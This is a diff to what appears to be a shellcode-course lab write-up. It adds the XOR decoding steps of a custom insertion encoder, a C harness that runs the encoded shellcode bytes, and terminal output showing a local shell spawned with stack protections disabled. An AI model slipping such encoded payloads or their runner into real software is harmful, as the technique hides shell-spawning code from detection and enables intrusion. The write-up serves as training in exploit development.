@@ -163,6 +163,13 @@ decode2:
 
 Finally, at last we have to XOR the remaining part of the shellcode by 0x46.
 
+The procedure of the XOR operation should be the pollowing:
+
++ Perform a XOR operation with 0x46 on the value of ESI.
++ Increment ESI, pointing to the next byte.
++ Continue the loop.
++ Once this is finished, jump to the fully decoded shellcode.
+
 ```term
 decode3:
 
@@ -173,9 +180,35 @@ decode3:
 
 ```
 
+Let's test this encoder within the C format:
+
+```term
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\xeb\x38\x5d\x89\xee\x8d\x7e\x01\x31\xc0\x31\xdb\xb1\x2c\xb0\x01\x8a\x1c\x06\x80\xf3\x45\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xe2\xef\xb1\x16\x31\xf6\x89\xee\xf6\x16\x46\xe2\xfb\xb1\x16\x31\xf6\x89\xee\x80\x36\x46\x46\xe2\xfa\xeb\x05\xe8\xc3\xff\xff\xff\x88\x45\x79\x45\xe9\x45\xd1\x45\x96\x45\x96\x45\xca\x45\xd1\x45\xd1\x45\x96\x45\xdb\x45\xd0\x45\xd7\x45\x30\x45\x5a\x45\xe9\x45\x30\x45\x5b\x45\x09\x45\xb2\x45\x74\x45\x39\x45";
+
+main()
+{
+
+  printf("Shellcode Length:  %d\n", strlen(code));
+
+        int (*ret)() = (int(*)())code;
+
+        ret();
+
+}
+```
+
 #### EndGame
 
-
+```term
+whitecr0wz@SLAE:~/assembly/assignments/Assignment_4$ gcc custom_insertion.c -o custom_insertion -fno-stack-protector -z execstack -w 
+whitecr0wz@SLAE:~/assembly/assignments/Assignment_4$ ./custom_insertion 
+Shellcode Length:  107
+$
+```
 
 ### Code
 
